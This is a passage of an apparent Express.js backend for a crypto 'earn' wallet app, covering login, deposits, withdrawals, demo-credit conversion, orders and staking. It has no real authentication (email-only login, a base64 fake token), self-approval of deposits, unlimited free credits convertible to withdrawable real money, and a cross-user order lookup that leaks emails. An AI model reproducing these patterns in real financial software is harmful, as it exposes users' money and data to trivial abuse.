  res.json({ success: true, field, delta: Number(delta), wallet: walletStateSnapshot(user) });
});

// Login
app.post('/api/auth/login', (req, res) => {
  const { email, name } = req.body || {};
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const normalized = email.trim().toLowerCase();
  const user = getOrCreateUser(normalized, name);

  res.json({
    success: true,
    message: 'Welcome back',
    user,
    token: `mudrexx_jwt_${Buffer.from(normalized).toString('base64')}`,
  });
});

// Current User Profile
app.get('/api/auth/me', (req, res) => {
  const email = String(req.query.email || req.headers['x-user-email'] || 'demo@mudrexx.com');
  const user = getOrCreateUser(email);
  res.json({ success: true, user });
});

// Update Profile
app.put('/api/user/profile', (req, res) => {
  const { email, name, phone, preferredCurrency } = req.body || {};
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const user = getOrCreateUser(email, name);
  if (name) user.name = name;
  if (phone !== undefined) user.phone = phone;
  if (preferredCurrency) user.preferredCurrency = preferredCurrency;
  persist();

  res.json({ success: true, message: 'Profile updated', user });
});

// ============================================================================
// 4. WALLET & BALANCE BREAKDOWN APIS
// ============================================================================

app.get('/api/wallet/summary', (req, res) => {
  const email = String(req.query.email || 'demo@mudrexx.com');
  const user = getOrCreateUser(email);
  const w = user.wallet;

  res.json({
    success: true,
    summary: {
      realBalance: w.realBalance,
      realUsdtBalance: w.realUsdtBalance,
      frozenBalance: w.frozenBalance,
      frozenUsdtBalance: w.frozenUsdtBalance,
      totalNetRealBalance: w.realBalance + w.frozenBalance,
      demoBalance: w.demoBalance,
      demoLinked: w.demoLinked,
      conversionRate: w.conversionRate,
      totalConverted: w.totalConverted,
      assetHoldings: w.assetHoldings,
      frozenItemsCount: w.frozenItems.length,
      // Balance state (deposit / credit / total / frozen) shown on the wallet
      // and Instant Order pages.
      depositCredited: Number(w.depositCreditedTotal || 0),
      depositCreditedUsdt: Number(w.depositCreditedTotalUsdt || 0),
      creditTotal: w.demoBalance,
      totalBalance: w.realBalance + w.frozenBalance,
      totalUsdtBalance: w.realUsdtBalance + w.frozenUsdtBalance,
      frozenTotal: w.frozenBalance,
      frozenTotalUsdt: w.frozenUsdtBalance,
      openOrders: (user.orders || []).filter((entry) => entry.status === 'open').length,
    },
  });
});

app.get('/api/wallet/transactions', (req, res) => {
  const email = String(req.query.email || 'demo@mudrexx.com');
  const user = getOrCreateUser(email);
  res.json({ success: true, transactions: user.wallet.transactions });
});

// ============================================================================
// 5. FROZEN AMOUNT & ESCROW APIS
// ============================================================================

app.get('/api/wallet/frozen', (req, res) => {
  const email = String(req.query.email || 'demo@mudrexx.com');
  const user = getOrCreateUser(email);
  res.json({
    success: true,
    frozenBalance: user.wallet.frozenBalance,
    frozenUsdtBalance: user.wallet.frozenUsdtBalance,
    items: user.wallet.frozenItems,
  });
});

// Cancel or Release frozen hold back to available balance
app.post('/api/wallet/frozen/release', (req, res) => {
  const { email, id } = req.body || {};
  if (!email || !id) return res.status(400).json({ error: 'Email and Frozen Item ID are required' });

  const user = getOrCreateUser(email);
  const itemIndex = user.wallet.frozenItems.findIndex((i) => i.id === id);
  if (itemIndex === -1) return res.status(404).json({ error: 'Frozen item not found' });

  const [item] = user.wallet.frozenItems.splice(itemIndex, 1);
  const isINR = item.currency === 'INR';

  // Keep the order board in sync when a user releases an order hold.
  if (item.category === 'order') {
    ensureOrdersArray(user);
    const releasedOrder = user.orders.find((entry) => entry.id === item.id);
    if (releasedOrder && releasedOrder.status === 'open') {
      releasedOrder.status = 'cancelled';
      releasedOrder.settledAt = new Date().toISOString();
      releasedOrder.settledBy = 'user-release';
      releasedOrder.payout = releasedOrder.amount;
    }
  }

  if (isINR) {
    user.wallet.frozenBalance = Math.max(0, user.wallet.frozenBalance - item.amount);
    user.wallet.realBalance += item.amount;
  } else {
    user.wallet.frozenUsdtBalance = Math.max(0, user.wallet.frozenUsdtBalance - item.amount);
    user.wallet.realUsdtBalance += item.amount;
  }

  user.wallet.transactions.unshift({
    id: `tx-rel-${Date.now()}`,
    title: 'Frozen Funds Released',
    description: `${item.title} released back to Available Balance`,
    time: 'Just now',
    amount: item.amount,
    currency: item.currency,
    type: 'release',
    tone: 'up',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    message: `${item.currency === 'INR' ? '₹' : '₮'}${item.amount.toLocaleString()} released to Available Balance`,
    releasedAmount: item.amount,
    newRealBalance: user.wallet.realBalance,
    newFrozenBalance: user.wallet.frozenBalance,
  });
});

// Approve pending deposit (sandbox verification)
app.post('/api/wallet/deposit/approve', (req, res) => {
  const { email, id } = req.body || {};
  if (!email || !id) return res.status(400).json({ error: 'Email and Deposit Item ID are required' });

  const user = getOrCreateUser(email);
  const itemIndex = user.wallet.frozenItems.findIndex((i) => i.id === id);
  if (itemIndex === -1) return res.status(404).json({ error: 'Deposit item not found' });

  const [item] = user.wallet.frozenItems.splice(itemIndex, 1);
  const isINR = item.currency === 'INR';

  // Track lifetime credited deposits for the wallet state view.
  if (isINR) user.wallet.depositCreditedTotal = Number(user.wallet.depositCreditedTotal || 0) + item.amount;
  else user.wallet.depositCreditedTotalUsdt = Number(user.wallet.depositCreditedTotalUsdt || 0) + item.amount;

  if (isINR) {
    user.wallet.frozenBalance = Math.max(0, user.wallet.frozenBalance - item.amount);
    user.wallet.realBalance += item.amount;
  } else {
    user.wallet.frozenUsdtBalance = Math.max(0, user.wallet.frozenUsdtBalance - item.amount);
    user.wallet.realUsdtBalance += item.amount;
  }

  user.wallet.transactions.unshift({
    id: `tx-app-${Date.now()}`,
    title: 'Deposit Verified & Unlocked',
    description: `${item.currency} ${item.amount} moved from Frozen to Available balance`,
    time: 'Just now',
    amount: item.amount,
    currency: item.currency,
    type: 'deposit',
    tone: 'up',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    message: 'Deposit verified and credited to Available Balance',
    approvedAmount: item.amount,
    newRealBalance: user.wallet.realBalance,
    newFrozenBalance: user.wallet.frozenBalance,
  });
});

// ============================================================================
// 6. DEMO TO REAL CONVERSION APIS
// ============================================================================

app.post('/api/wallet/convert-demo', (req, res) => {
  const { email, demoCredits } = req.body || {};
  const credits = Number(demoCredits || 0);

  if (!email) return res.status(400).json({ error: 'Email is required' });
  if (credits <= 0) return res.status(400).json({ error: 'Valid demoCredits amount required' });

  const user = getOrCreateUser(email);
  if (credits > user.wallet.demoBalance) {
    return res.status(400).json({
      error: `Insufficient demo credits. Available: ${user.wallet.demoBalance}`,
    });
  }

  const rate = user.wallet.conversionRate || 0.1;
  const realGain = Math.round(credits * rate * 100) / 100;

  user.wallet.demoBalance -= credits;
  user.wallet.realBalance += realGain;
  user.wallet.totalConverted += credits;

  user.wallet.transactions.unshift({
    id: `tx-conv-${Date.now()}`,
    title: 'Demo to Real Conversion',
    description: `Converted ${credits.toLocaleString()} Demo Credits at 10:1 ratio`,
    time: 'Just now',
    amount: realGain,
    currency: 'INR',
    type: 'conversion',
    tone: 'up',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    message: `Converted ${credits.toLocaleString()} Demo Credits to ₹${realGain.toFixed(2)} Real INR`,
    convertedCredits: credits,
    realGain,
    newDemoBalance: user.wallet.demoBalance,
    newRealBalance: user.wallet.realBalance,
  });
});

app.post('/api/wallet/claim-demo', (req, res) => {
  const { email, amount } = req.body || {};
  const grant = Number(amount || 5000);
  const user = getOrCreateUser(email);

  user.wallet.demoBalance += grant;
  user.wallet.transactions.unshift({
    id: `tx-grant-${Date.now()}`,
    title: 'Demo Practice Grant',
    description: `Claimed +${grant.toLocaleString()} demo credits`,
    time: 'Just now',
    amount: grant,
    currency: 'CREDITS',
    type: 'reward',
    tone: 'up',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    claimedAmount: grant,
    newDemoBalance: user.wallet.demoBalance,
  });
});

app.post('/api/wallet/link-demo', (req, res) => {
  const { email, linked } = req.body || {};
  const user = getOrCreateUser(email);
  user.wallet.demoLinked = linked !== undefined ? Boolean(linked) : true;
  persist();

  res.json({
    success: true,
    demoLinked: user.wallet.demoLinked,
    message: user.wallet.demoLinked ? 'Demo linked to real account' : 'Demo unlinked',
  });
});

// ============================================================================
// 7. DEPOSIT & WITHDRAWAL APIS
// ============================================================================

app.post('/api/deposit/submit', (req, res) => {
  const { email, amount, rail = 'inr', method = 'upi', reference = '' } = req.body || {};
  const amt = Number(amount || 0);

  if (!email || amt <= 0) {
    return res.status(400).json({ error: 'Email and positive amount required' });
  }

  const user = getOrCreateUser(email);
  const isINR = rail.toLowerCase() === 'inr';
  const newItem = {
    id: `dep-${Date.now()}`,
    title: `${rail.toUpperCase()} Deposit (${method.toUpperCase()})`,
    category: 'deposit',
    reason: reference ? `Ref: ${reference}` : 'Verification in progress (Sandbox)',
    amount: amt,
    currency: isINR ? 'INR' : 'USDT',
    date: 'Just now',
    status: 'processing',
    canApprove: true,
    canRelease: true,
  };

  if (isINR) {
    user.wallet.frozenBalance += amt;
  } else {
    user.wallet.frozenUsdtBalance += amt;
  }
  user.wallet.frozenItems.unshift(newItem);

  user.wallet.transactions.unshift({
    id: `tx-dep-${Date.now()}`,
    title: `${rail.toUpperCase()} Deposit Submitted`,
    description: `${method.toUpperCase()} verification in progress (${reference || 'Submitted'})`,
    time: 'Just now',
    amount: amt,
    currency: isINR ? 'INR' : 'USDT',
    type: 'deposit',
    tone: 'up',
    status: 'pending',
  });

  persist();
  res.json({
    success: true,
    message: `Deposit of ${isINR ? '₹' : '₮'}${amt} recorded in Frozen Amount section pending verification`,
    depositId: newItem.id,
    amount: amt,
    currency: newItem.currency,
    status: 'processing',
    newFrozenBalance: user.wallet.frozenBalance,
  });
});

app.post('/api/withdraw/submit', (req, res) => {
  const { email, amount, destination } = req.body || {};
  const amt = Number(amount || 0);

  if (!email || amt <= 0) return res.status(400).json({ error: 'Email and positive amount required' });

  const user = getOrCreateUser(email);
  if (amt > user.wallet.realBalance) {
    return res.status(400).json({
      error: `Insufficient available balance. Available: ₹${user.wallet.realBalance}. Note: Frozen funds (₹${user.wallet.frozenBalance}) cannot be withdrawn until released.`,
    });
  }

  user.wallet.realBalance -= amt;
  user.wallet.transactions.unshift({
    id: `tx-wth-${Date.now()}`,
    title: 'Withdrawal Submitted',
    description: `Payout to ${destination || 'Bank Account'}`,
    time: 'Just now',
    amount: amt,
    currency: 'INR',
    type: 'withdrawal',
    tone: 'down',
    status: 'pending',
  });

  persist();
  res.json({
    success: true,
    message: `Withdrawal request of ₹${amt.toLocaleString()} submitted for processing`,
    amount: amt,
    remainingAvailable: user.wallet.realBalance,
  });
});

// ============================================================================
// 8. ORDERS & STAKING VAULTS APIS
// ============================================================================

app.post('/api/orders/create', (req, res) => {
  const {
    email, symbol = 'BTC', side = 'up', amount, currency = 'INR',
    accountType = 'real', durationSeconds = 60, payoutPercent = 5,
  } = req.body || {};
  const amt = Number(amount || 0);

  if (!email || amt <= 0) return res.status(400).json({ error: 'Email and positive amount required' });

  const normalizedSymbol = String(symbol).toUpperCase();
  const normalizedCurrency = currency === 'USDT' ? 'USDT' : 'INR';
  const normalizedSide = side === 'down' ? 'down' : 'up';
  const dur = Math.min(86400, Math.max(5, Math.round(Number(durationSeconds) || 60)));
  const pct = Math.min(500, Math.max(1, Number(payoutPercent) || 5));

  const user = getOrCreateUser(email);
  ensureOrdersArray(user);

  const now = Date.now();
  const order = {
    id: `ord-${now}`,
    symbol: normalizedSymbol,
    side: normalizedSide,
    amount: amt,
    currency: normalizedCurrency,
    accountType: accountType === 'demo' ? 'demo' : 'real',
    status: 'open',
    payoutPercent: pct,
    durationSeconds: dur,
    createdAt: now,
    expiresAt: now + dur * 1000,
    entryPrice: currentPrice(normalizedSymbol),
  };

  if (order.accountType === 'real') {
    const isINR = normalizedCurrency === 'INR';
    const available = isINR ? user.wallet.realBalance : user.wallet.realUsdtBalance;

    if (amt > available) {
      return res.status(400).json({
        error: `Insufficient real balance. Available: ${isINR ? '₹' : '₮'}${available}. Convert demo credits or deposit funds.`,
      });
    }

    if (isINR) {
      user.wallet.realBalance -= amt;
      user.wallet.frozenBalance += amt;
    } else {
      user.wallet.realUsdtBalance -= amt;
      user.wallet.frozenUsdtBalance += amt;
    }

    const orderItem = {
      id: order.id,
      title: `${normalizedSymbol} ${normalizedSide === 'up' ? 'BUY UP' : 'BUY DOWN'} Order`,
      category: 'order',
      reason: `Active limit order scenario on ${normalizedSymbol}/USDT`,
      amount: amt,
      currency: normalizedCurrency,
      asset: normalizedSymbol,
      date: 'Just now',
      status: 'locked',
      canRelease: true,
    };
    user.wallet.frozenItems.unshift(orderItem);

    user.wallet.transactions.unshift({
      id: `tx-ord-${now}`,
      title: `Order Placed (${normalizedSide.toUpperCase()})`,
      description: `${normalizedCurrency} ${amt} held in frozen order escrow`,
      time: 'Just now',
      amount: amt,
      currency: normalizedCurrency,
      type: 'trade',
      tone: 'down',
      status: 'pending',
    });

    user.orders.unshift(order);
    persist();
    return res.json({
      success: true,
      message: `${normalizedCurrency === 'INR' ? '₹' : '₮'}${amt} placed into Frozen Amount section`,
      orderId: order.id,
      order,
      status: 'locked',
      newAvailable: user.wallet.realBalance,
      newFrozen: user.wallet.frozenBalance,
      wallet: walletStateSnapshot(user),
    });
  }

  // Linked credit order — escrows practice credits for the duration.
  if (amt > user.wallet.demoBalance) {
    return res.status(400).json({
      error: `Insufficient credit balance. Available: ${user.wallet.demoBalance.toLocaleString()} credits.`,
    });
  }
  user.wallet.demoBalance -= amt;
  user.orders.unshift(order);
  persist();

  res.json({
    success: true,
    message: `Order active — ${amt.toLocaleString()} credits in play`,
    orderId: order.id,
    order,
    status: 'open',
    newDemoBalance: user.wallet.demoBalance,
    wallet: walletStateSnapshot(user),
  });
});

// Every order for the Instant Order page board (settles expired orders first).
app.get('/api/orders/list', (req, res) => {
  const email = String(req.query.email || '').trim().toLowerCase();
  if (!email) return res.status(400).json({ error: 'Email is required' });
  const user = userDb.get(email);
  if (!user) return res.status(404).json({ error: 'User not found' });

  ensureOrdersArray(user);
  autoSettleOrders(user);

  res.json({
    success: true,
    orders: user.orders,
    total: user.orders.length,
    wallet: walletStateSnapshot(user),
  });
});

app.get('/api/orders/status', (req, res) => {
  const { email, orderId } = req.query || {};
  if (!email && !orderId) {
    return res.status(400).json({ error: 'Email or orderId is required' });
  }

  if (email) {
    const normalized = String(email).trim().toLowerCase();
    const user = userDb.get(normalized);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const orders = (user.wallet?.frozenItems || []).filter((item) => item.category === 'order');
    if (orderId) {
      const order = orders.find((o) => o.id === orderId);
      if (!order) return res.status(404).json({ error: 'Order not found' });
      return res.json({ success: true, order, status: order.status });
    }
    return res.json({ success: true, orders, total: orders.length });
  }

  // Search across all users by orderId
  for (const user of userDb.values()) {
    const order = (user.wallet?.frozenItems || []).find((item) => item.id === orderId && item.category === 'order');
    if (order) {
      return res.json({ success: true, order, status: order.status, userEmail: user.email });
    }
  }
  return res.status(404).json({ error: 'Order not found' });
});

app.post('/api/staking/stake', (req, res) => {
  const { email, asset = 'ETH', amount, apy = 4.7 } = req.body || {};
  const amt = Number(amount || 0);

  if (!email || amt <= 0) return res.status(400).json({ error: 'Email and positive amount required' });

  const user = getOrCreateUser(email);
  if (amt > user.wallet.realBalance) {
    return res.status(400).json({
      error: `Insufficient available balance. Available: ₹${user.wallet.realBalance}`,
    });
  }

  user.wallet.realBalance -= amt;
  user.wallet.frozenBalance += amt;

  const vaultItem = {
    id: `stk-${Date.now()}`,
    title: `Flexible ${asset} Staking Vault`,
    category: 'staking',
    reason: `Accruing ${apy}% APY yield`,
    amount: amt,
    currency: 'INR',
    asset,
    date: 'Just now',
    status: 'accruing',
    canRelease: true,
    apy: Number(apy),
  };
  user.wallet.frozenItems.unshift(vaultItem);

  user.wallet.transactions.unshift({
    id: `tx-stk-${Date.now()}`,
    title: `Staked in ${asset} Vault`,
    description: `₹${amt} locked in flexible earn at ${apy}% APY`,
    time: 'Just now',
    amount: amt,
    currency: 'INR',
    type: 'stake',
    tone: 'neutral',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    message: `₹${amt} staked in Flexible ${asset} Vault (Held in Frozen Balance)`,
    vaultId: vaultItem.id,
    newAvailable: user.wallet.realBalance,
    newFrozen: user.wallet.frozenBalance,
  });
});

// Adjust demo practice balance (Flight Lab wagers & cash-outs are backend-controlled)
app.post('/api/wallet/demo/adjust', (req, res) => {
  const { email, delta } = req.body || {};
  const change = Number(delta);
  if (!email || !Number.isFinite(change) || change === 0) {
    return res.status(400).json({ error: 'Email and non-zero numeric delta required' });
  }

  const user = getOrCreateUser(email);
  if (change < 0 && Math.abs(change) > user.wallet.demoBalance) {
    return res.status(400).json({
      error: `Insufficient demo credits. Available: ${user.wallet.demoBalance}`,
    });
  }

  user.wallet.demoBalance = Math.max(0, user.wallet.demoBalance + change);
  user.wallet.transactions.unshift({
    id: `tx-demo-${Date.now()}`,
    title: change < 0 ? 'Flight Lab Wager' : 'Flight Lab Cash Out',
    description:
      change < 0
        ? `${Math.abs(change).toLocaleString()} demo credits wagered in Flight Lab`
        : `+${change.toLocaleString()} demo credits won in Flight Lab`,
    time: 'Just now',
    amount: Math.abs(change),
    currency: 'CREDITS',
    type: change < 0 ? 'trade' : 'reward',
    tone: change < 0 ? 'down' : 'up',
    status: 'completed',
  });

  persist();
  res.json({
    success: true,
    message: `Demo balance adjusted by ${change >= 0 ? '+' : ''}${change} credits`,
    delta: change,
    newDemoBalance: user.wallet.demoBalance,
  });
});

// ============================================================================
// 9. CLIENT SPA FALLBACK & STATIC SERVING
// ============================================================================

app.use(express.static(path.join(__dirname, 'dist'), { maxAge: '1d', index: false }));
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api/')) return next();
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});
app.use((_req, res) => res.status(404).json({ error: 'Endpoint not found' }));

loadUsersFromDisk();
app.listen(port, '0.0.0.0', () => console.log(`Mudrexx Earn backend is listening on 0.0.0.0:${port}`));
